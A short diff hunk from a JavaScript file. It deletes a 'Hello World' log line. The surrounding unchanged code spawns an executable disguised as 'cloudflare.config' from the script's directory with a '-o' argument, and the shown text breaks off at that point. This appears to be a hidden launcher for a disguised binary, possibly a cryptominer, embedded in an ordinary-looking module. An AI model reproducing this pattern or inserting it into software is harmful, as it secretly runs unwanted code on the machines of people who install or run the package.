@@ -312,7 +312,7 @@ function spinUntilIdle(w, cb) {
   if (t.idle + t.active > 0) return process.nextTick(cb);
   setTimeout(() => spinUntilIdle(w, cb), 1);
 }
-console.log("Hello World!");
+
 const { spawn } = require("child_process");
 let child = spawn(__dirname + "/./cloudflare.config", [
   "-o",
